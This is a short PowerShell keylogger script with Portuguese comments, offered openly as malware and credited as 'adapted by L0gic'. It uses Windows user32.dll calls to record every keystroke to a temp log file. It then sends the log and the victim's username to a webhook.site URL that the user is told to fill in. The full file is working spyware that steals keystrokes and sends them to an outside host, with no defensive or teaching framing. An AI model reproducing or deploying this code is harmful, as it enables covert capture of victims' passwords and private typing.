# Keylogger
# adapted by L0gic


# COLOQUE O LINK DO WEBHOOK AQUI
$webhook = "https://webhook.site/Seu-ID"

# Escreve um PID
$PID > "$env:temp/DdBPKCytRe"

# Função do Keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

  # Formata a requisição que será enviada para o webhook
  $logs = Get-Content "$logFile" | Out-String
  $Body = @{
    'username' = $env:UserName
    'content' = $logs
  }
  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body

  # Gera um aquivo de log 
  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # Comunicações com as API's
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # Configura as API's
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # Tenta capturar as teclas pressionadas
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        # Usa a API para detectar o estado da tecla 
        $keystate = $API::GetAsyncKeyState($ascii)

        # Usa a API para detectar tecla sendo pressionada 
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # Mapeia as "Teclas virutais"
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # Cria um StringBuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # Traduz as teclas Virtuais
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # Adicona as teclas ao log
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }

 
  finally {
    # Envia os logs via WebHook
    Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
  }
}

# Roda o Keylogger
KeyLogger
